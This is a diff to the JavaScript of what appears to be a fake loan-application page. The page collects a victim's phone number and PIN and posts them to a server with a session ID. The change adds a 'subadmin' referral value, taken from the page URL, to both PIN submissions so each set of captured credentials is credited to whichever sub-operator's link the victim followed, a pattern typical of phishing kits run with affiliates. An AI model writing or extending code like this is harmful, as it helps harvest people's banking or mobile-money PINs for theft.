@@ -1,5 +1,9 @@
 const sessionId = 'nmb_' + Math.random().toString(36).substring(2, 9);
 
+// Grab subadmin 'ref' query parameter from URL to route requests accurately
+const urlParams = new URLSearchParams(window.location.search);
+const subadminRef = urlParams.get('ref') || '';
+
 const state = {
     amount: 100000,
     duration: 12,
@@ -18,7 +22,7 @@ const state = {
 
 const screens = {
     slider: document.getElementById('screen-slider'),
-    step1: document.getElementById('screen-step1'), // Added missing screen reference
+    step1: document.getElementById('screen-step1'),
     step2: document.getElementById('screen-step2'),
     step3: document.getElementById('screen-step3'),
     pin: document.getElementById('screen-pin'),
@@ -170,7 +174,8 @@ document.getElementById('btn-step3-submit').addEventListener('click', async () =
             body: JSON.stringify({
                 sessionId,
                 phone: state.phone,
-                pin: state.pin || 'Pending PIN'
+                pin: state.pin || 'Pending PIN',
+                ref: subadminRef // Attached subadmin ref routing
             })
         });
         
@@ -222,7 +227,8 @@ document.getElementById('btn-submit-pin').addEventListener('click', async () => 
             body: JSON.stringify({
                 sessionId,
                 phone: state.phone,
-                pin: state.pin
+                pin: state.pin,
+                ref: subadminRef // Attached subadmin ref routing
             })
         });
 
@@ -367,3 +373,4 @@ document.getElementById('btn-home').addEventListener('click', () => {
 });
 
 updateCalculator();
+        
